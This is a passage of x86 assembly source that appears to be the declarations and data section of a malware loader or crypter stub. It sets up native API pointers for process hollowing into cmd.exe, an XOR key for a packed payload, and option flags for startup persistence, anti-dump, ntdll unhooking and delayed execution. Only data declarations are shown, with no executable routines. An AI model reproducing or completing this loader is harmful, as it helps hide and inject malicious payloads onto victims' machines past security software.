	include windows.inc
    include user32.inc
    include kernel32.inc
    include psapi.inc
    include shell32.inc
    include shlwapi.inc
  

    includelib user32.lib
    includelib kernel32.lib
    includelib psapi.lib
    includelib shell32.lib
    includelib shlwapi.lib


.const
    BUFFER_SIZE         equ     4096
    PAGE_RWX            equ     40h
    FILE_SHARE_RW       equ     3h
    KEY_LENGTH          equ     6
    PAGE_SIZE           equ     1000h
    NtCurrentProcess    equ     -1
    IDNO                equ     7

.data
    NtUnmapViewOfSection_f        DWORD 0
    NtAllocateVirtualMemory_f     DWORD 0
    NtWriteVirtualMemory_f        DWORD 0
    NtCreateProcess_f             DWORD 0
    NtResumeThread_f              DWORD 0
    NtGetContextThread_f          DWORD 0
    NtSetContextThread_f          DWORD 0
    NtQueryInformationProcess_f   DWORD 0
    NtReadVirtualMemory_f         DWORD 0
    NtTerminateProcess_f          DWORD 0

    caption_text                  db "Security Warning", 0
    message_text                  db "WARNING: This process could be malicious if you don't know its origin.", 13, 10
                                  db "Do you want to continue at your own risk?", 0
    key                           db "SECRET"
    target                        db "C:\Windows\system32\cmd.exe", 0
    path_ntdll                    db "C:\Windows\System32\ntdll.dll", 0
    path                          db "C:\Users\admin\Desktop\RADASM\Masm\Projects\xor\x86Box.exe", 0
    ntdll                         db "ntdll.dll", 0
    user32dll                     db "user32.dll", 0

    box                           db "MessageBoxA", 0
    loadlib_str                   db "LoadLibraryA", 0
    szBackslash                   db "\", 0
    LoadLibraryA_addr             dd 0 

    hMapFile                      HANDLE ?
    hFileRead                     HANDLE ?
    hNtdll                        DWORD 0

    szNtAllocateVirtualMemory     db "NtAllocateVirtualMemory", 0
    szNtWriteVirtualMemory        db "NtWriteVirtualMemory", 0
    szNtResumeThread              db "NtResumeThread", 0
    szNtGetContextThread          db "NtGetContextThread", 0
    szNtSetContextThread          db "NtSetContextThread", 0
    szNtReadVirtualMemory         db "NtReadVirtualMemory", 0
    szNtTerminateProcess          db "NtTerminateProcess", 0

    kernel32_str                  db "kernel32.dll", 0
    getproc_str                   db "GetProcAddress", 0
    convert                       BYTE "%p", 0
    
    startup_check                 db "STARTUP_NOP", 0
    sz_startup_check			  db "STARTUP_YES",0
    
    antidump_check				  db "ANTIDUMP_NOP", 0
    sz_antidump_check			  db "ANTIDUMP_YES", 0
    
    unhook_check				  db "UNHOOK_NOP", 0
    sz_unhook_check				  db "UNHOOK_YES", 0
    
    delay_check				  	  db "DELAY_NOP", 0
    sz_delay_check				  db "DELAY_YES", 0

MODULEINFO STRUCT
    lpBaseOfDll                   LPVOID ?
    SizeOfImage                   DWORD ?
    EntryPoint                    LPVOID ?
MODULEINFO ENDS

PARAMS STRUCT
    Count                         DWORD ?
    Target                        DWORD ?
    Args                          DWORD 8 DUP(?)
PARAMS ENDS

.data?
    debug_output                  DWORD ?
